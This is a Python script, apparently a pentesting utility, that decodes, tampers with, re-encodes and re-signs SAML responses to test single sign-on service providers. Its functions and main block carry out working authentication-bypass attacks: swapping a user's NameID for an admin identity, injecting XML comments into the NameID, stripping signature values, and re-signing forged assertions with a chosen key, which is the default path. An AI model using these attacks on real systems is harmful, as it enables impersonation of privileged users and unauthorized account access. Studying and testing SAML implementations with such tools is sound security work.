"""
Utility Python3 script to manually alter a SAML Request/Response in order to manually inspect the behavior of a service validating/using the SAML Request/Response.

Useful to analyze specific cases returning a different/strange response content/code/length during the application study.

Dependencies:
    pip install lxml signxml

References:
    https://duo.com/blog/duo-finds-saml-vulnerabilities-affecting-multiple-implementations
    https://stackoverflow.com/questions/64295570/sign-saml-response-in-python
    https://signxml.readthedocs.io/en/latest/
    https://www.samltool.com/format_x509cert.php

PEM format expected for the Certificate and the Private key - Key pair length must be >= 2048 bits:
    Certificate:
        -----BEGIN CERTIFICATE-----
        MIIC/zCCA...
        -----END CERTIFICATE----- 
   
    Private key:
        -----BEGIN PRIVATE KEY-----
        MIIEvAIBA...
        -----END PRIVATE KEY-----
"""
import base64
import urllib.parse
import re
import xml.etree.ElementTree as ET
from lxml import etree
from signxml import XMLSigner

DEFAULT_ENCODING = "utf-8"
DEBUG = True
SAML_NAMESPACES = {"ds": "http://www.w3.org/2000/09/xmldsig#", "samlp": "urn:oasis:names:tc:SAML:2.0:protocol", "saml": "urn:oasis:names:tc:SAML:2.0:assertion"}


def decode(saml_content):
    return base64.b64decode(saml_content.encode(DEFAULT_ENCODING)).decode(DEFAULT_ENCODING)


def encode(saml_content):
    return base64.b64encode(saml_content.encode(DEFAULT_ENCODING)).decode(DEFAULT_ENCODING)


def load_from_file(saml_content_file_location):
    with open(saml_content_file_location, "r", encoding=DEFAULT_ENCODING) as f:
        saml_content = urllib.parse.unquote(f.read())
    return saml_content


def save_to_file(saml_content_file_location, saml_content, url_encode=True):
    with open(saml_content_file_location, "w", encoding=DEFAULT_ENCODING) as f:
        content = saml_content
        if url_encode:
            content = urllib.parse.quote(content)
        f.write(content)


def extract_nodes(xpath_expr, saml_content):
    root = ET.fromstring(saml_content)
    return root.findall(xpath_expr, SAML_NAMESPACES)


def signature_omits_comments(saml_content):
    # See explanation on https://duo.com/blog/duo-finds-saml-vulnerabilities-affecting-multiple-implementations
    algos_not_omitting_comments_in_signature = ["http://www.w3.org/TR/2001/REC-xml-c14n-20010315#WithComments",
                                                "http://www.w3.org/2001/10/xml-exc-c14n#WithComments",
                                                "http://www.w3.org/2006/12/xml-c14n11#WithComments"]
    result = True
    nodes = extract_nodes(".//ds:CanonicalizationMethod", saml_content)
    for node in nodes:
        if node.attrib["Algorithm"] in algos_not_omitting_comments_in_signature:
            result = False
    return result


def remove_assertion_signatures(saml_content):
    # Remove the content of the node "<ds:SignatureValue></ds:SignatureValue>" from all assertion signature of a SAML response
    # Exploit a case in which the Service Provider verify the signature only if it is present
    # Use a string approach to not risk to alter the response with an XML parser if it was already altered in case of vulnerabilities chaining
    signature_regex = r'<ds:SignatureValue>([a-zA-Z0-9\/=+]+)<\/ds:SignatureValue>'
    saml_content_altered = re.sub(signature_regex, "<ds:SignatureValue></ds:SignatureValue>", saml_content)
    return saml_content_altered


def sign_saml_response(saml_content, certificate_pem_content, private_key_pem_content, canonicalization_algo="http://www.w3.org/2001/10/xml-exc-c14n#", signature_algo="rsa-sha256", digest_algo="sha256", add_namespace_on_keyinfo_tag=False):
    # Remove any existing '<ds:Signature xmlns:ds="http://www.w3.org/2000/09/xmldsig#">...</ds:Signature>' tags
    # /!!!\ Currently only support a single Assertion node in a SAML response
    while "</ds:Signature>" in saml_content:
        start = saml_content.index("<ds:Signature")
        end = saml_content.index("</ds:Signature>")
        saml_content = saml_content[:start] + saml_content[end+len("</ds:Signature>"):]
    # Taken from https://stackoverflow.com/a/64355750
    assertion_identifier = extract_nodes(".//saml:Assertion", saml_content)[0].attrib["ID"]
    saml_root = etree.fromstring(saml_content)
    xml_signer = XMLSigner(c14n_algorithm=canonicalization_algo, signature_algorithm=signature_algo, digest_algorithm=digest_algo)
    signed_saml_root = xml_signer.sign(saml_root, key=private_key_pem_content, cert=certificate_pem_content, reference_uri=assertion_identifier)
    signed_saml_root_str = etree.tostring(signed_saml_root, encoding="unicode")
    # Move the Signature node into the Assertion node
    signature_block_start = signed_saml_root_str.index("<ds:Signature")
    signature_block_end = signed_saml_root_str.index("</ds:Signature>")
    signature_block = signed_saml_root_str[signature_block_start:signature_block_end + len("</ds:Signature>")]
    signed_saml_root_str = signed_saml_root_str[:signature_block_start] + signed_saml_root_str[signature_block_end + len("</ds:Signature>"):]
    signed_saml_root_str = signed_saml_root_str.replace("<Subject>", f"{signature_block}<Subject>")
    if add_namespace_on_keyinfo_tag:
        # The "signxml" lib produce a KeyInfo tag without the DS SAML namespace on the node like this: <ds:KeyInfo>...</ds:KeyInfo>
        # Depending on the parser of the SP it can cause trouble so this option allow adding the DS SAML namespace directly in the KeyInfo node
        # like this: <KeyInfo xmlns="http://www.w3.org/2000/09/xmldsig#">...</KeyInfo>
        signed_saml_root_str = signed_saml_root_str.replace('<ds:KeyInfo>', f"<KeyInfo xmlns=\"{SAML_NAMESPACES['ds']}\">")
        signed_saml_root_str = signed_saml_root_str.replace('</ds:KeyInfo>', '</KeyInfo>')
    signed_saml_root_str = signed_saml_root_str.replace("\n", "").replace("\r", "").strip()
    return signed_saml_root_str


if __name__ == "__main__":
    # ---------------------------------------------
    # Workspace context
    # ---------------------------------------------
    input_file = "1-saml_response_encoded.txt"
    output_file = "2-saml_response_encoded_altered.txt"
    debug_file = "3-saml_response.xml"
    with open("4-example.crt", mode="r", encoding=DEFAULT_ENCODING) as f:
        certificate_pem_content = f.read()
    with open("5-example.key", mode="r", encoding=DEFAULT_ENCODING) as f:
        private_key_pem_content = f.read()
    # ---------------------------------------------
    # Load and decode the SAML content
    # ---------------------------------------------
    saml_content = decode(load_from_file(input_file))
    # ---------------------------------------------
    # Do action on SAML content
    # ---------------------------------------------
    # --Attack with direct NameID replacement without modifying the assertion signature
    # saml_content = saml_content.replace("user@test.com", "admin@test.com")
    # --Attack with Comment injection: Require that signature omits comments !!!
    # print(f"Signature omits comments? {signature_omits_comments(saml_content)}")
    # saml_content = saml_content.replace("admin@test.com.lu", "admin@test.com<!---->.lu")
    # --Attack with signature stripping and NameID replacement
    # saml_content = remove_assertion_signatures(saml_content)
    # saml_content = saml_content.replace("user@test.com", "admin@test.com")
    # --Attack with re-signing a SAML response with a specified key pair
    saml_content = saml_content.replace("user@test.com", "admin@libcurl.so")
    saml_content = sign_saml_response(saml_content, certificate_pem_content, private_key_pem_content)
    # ---------------------------------------------
    # Encode and save the altered SAML content
    # ---------------------------------------------
    if DEBUG:
        save_to_file(debug_file, saml_content, False)
    save_to_file(output_file, encode(saml_content))
